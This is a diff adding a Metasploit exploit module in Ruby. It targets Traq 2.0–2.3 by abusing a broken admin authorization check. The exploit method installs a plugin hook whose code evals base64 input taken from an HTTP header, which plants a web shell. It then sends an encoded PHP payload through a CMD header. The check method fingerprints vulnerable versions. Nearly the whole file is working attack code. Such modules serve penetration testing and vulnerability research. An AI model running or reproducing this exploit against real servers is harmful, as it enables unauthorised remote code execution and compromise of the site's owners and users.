@@ -1,0 +1,108 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info={})
+		super(update_info(info,
+			'Name'           => 'Traq <= 2.3 Authentication Bypass / Remote Code Execution Exploit',
+			'Description'    => %q{
+				This module exploits an arbitrary command execution vulnerability in
+				Traq 2.0 to 2.3. It's in the admincp/common.php script.
+
+				This function is called in each script located into /admicp/ directory to
+				make sure the user has admin rights, but this is a broken authorization
+				schema due to the header() function doesn't stop the execution flow. This
+				can be exploited by malicious users to execute admin functionality resulting
+				for  e.g.  in execution of arbitrary PHP code leveraging of plugins.php
+				functionality.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         =>
+				[
+					'EgiX',  # Vulnerability discovery and exploit
+					'TecR0c' # Metasploit Module
+				],
+			'References'     =>
+				[
+					[ 'URL', 'http://www.exploit-db.com/exploits/18213/' ],
+					[ 'URL', 'http://traqproject.org/' ],
+				],
+			'Privileged'     => false,
+			'Payload'        =>
+				{
+					'Keys'        => ['php'],
+					'Space'       => 4000,
+					'DisableNops' => true,
+				},
+			'Platform'       => ['php'],
+			'Arch'           => ARCH_PHP,
+			'Targets'        => [[ 'Automatic', {} ]],
+			'DisclosureDate' => 'Dec 12 2011',
+			'DefaultTarget'  => 0))
+
+		register_options(
+			[
+				OptString.new('URI', [true, "The path to the Traq installation", "/"]),
+			],self.class)
+	end
+
+	def check
+		uri = datastore['URI']
+		uri += (datastore['URI'][-1, 1] == "/") ? "admincp/login.php" : "/admincp/login.php"
+
+		res = send_request_raw(
+			{
+				'uri'=> uri
+			}, 25)
+
+		if (res and res.body =~ /Powered by Traq 2.[0-3]/ )
+			return Exploit::CheckCode::Vulnerable
+		end
+		return Exploit::CheckCode::Safe
+	end
+
+	def exploit
+		p = Rex::Text.encode_base64(payload.encoded)
+
+		uri = datastore['URI']
+		uri += (datastore['URI'][-1, 1] == "/") ? "admincp/plugins.php?newhook" : "/admincp/plugins.php?newhook"
+
+		res = send_request_cgi(
+			{
+				'method'    => 'POST',
+				'uri'       => uri,
+				'vars_post' =>
+					{
+						'plugin_id' => '1',
+						'title' => '1',
+						'execorder' => '0',
+						'hook' => 'template_footer',
+						'code' => 'error_reporting(0);eval(base64_decode($_SERVER[HTTP_CMD]));die;'
+					}
+			}, 25)
+
+		uri = datastore['URI']
+		uri += (datastore['URI'][-1, 1] == "/") ? "index.php" : "/index.php"
+
+		res = send_request_cgi(
+			{
+				'method'  => 'GET',
+				'uri'     => uri,
+				'headers' =>
+					{
+						'CMD' => p,
+						'Connection' => 'Close',
+					},
+			}, 25)
+	end
+end
